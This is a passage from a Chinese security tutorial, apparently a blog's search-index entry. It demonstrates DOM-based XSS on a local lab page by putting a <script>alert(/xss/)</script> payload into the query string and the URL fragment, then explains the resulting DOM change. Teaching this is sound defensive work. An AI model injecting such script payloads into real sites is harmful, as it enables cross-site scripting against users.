/>④a.substring(a.indexOf(“message&#x3D;”)+8,a.length)：取截取a的值为字符串，即”<a href="http://172.16.1.1/DOM-XSS.php%22%EF%BC%8C%E4%BB%8E%E7%AC%AC8%E4%BD%8D%E5%BC%80%E5%A7%8B%EF%BC%8C%E6%88%AA%E5%8F%96a%E7%9A%84%E9%95%BF%E5%BA%A6%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%9B">http://172.16.1.1/DOM-XSS.php&quot;，从第8位开始，截取a的长度个字符；</a></li></ul><p>（2）修改参数为?message&#x3D;good，回车时页面显示good。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725095824340.png" alt="image-20230725095824340"><br />（3）修改参数为?message&#x3D;<script>alert(/xss/)</script>，回车时则出现弹窗。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725095836815.png" alt="image-20230725095836815"><br />（4）我们右键查看源代码，发现代码与刚刚编写的一致，并没有弹窗的内容。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725095847493.png" alt="image-20230725095847493"><br />（5）审查网页元素，则可以看到DOM树这里多出了个弹窗内容，就是上述document语句修改生成的。（有的浏览器查看结果有区别，可以试试不同浏览器的解析结果）<br />修改DOM树，浏览器重新渲染页面。<img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725095900321.png" alt="image-20230725095900321"><br />（6）修改参数为#message&#x3D;<script>alert(/xss/)</script>，回车时也出现弹窗。#后面内容为锚点，锚点内容不会提交到服务器。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725095910748.png" alt="image-20230725095910748"><br><a name="EbMo2"></a></p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6 总结"></a>6 总结</h2><p>（1）掌握XSS的攻击过程；<br />（2）掌握XSS的分类及各类原理；<br />（3）了解XSS的危害。<br />（4）掌握XSS的验证</p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安 </tag>
            
            <tag> xss </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
